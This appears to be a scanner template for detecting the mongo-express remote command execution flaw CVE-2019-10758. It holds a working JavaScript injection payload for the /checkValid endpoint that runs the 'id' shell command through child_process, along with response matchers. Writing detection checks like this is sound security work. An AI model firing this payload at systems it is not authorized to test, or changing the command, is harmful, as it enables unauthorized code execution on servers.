[info]
author = "ave"
description = "检测 mongo-express < 0.54.0 远程命令执行漏洞，利用 /checkValid 端点的 JavaScript 代码注入"
id = "POC-AVE-2019-0168"
name = "mongo-express RCE (CVE-2019-10758) PoC"
severity = "critical"
tags = ["ave-2019-0168"]
vuln_id = [
    "CVE-2019-10758",
    "AVE-2019-0168",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/checkValid"
protocol = "http"

[poc.requests.body]
content = 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")'
type = "form"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "uid=",
    "gid=",
]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
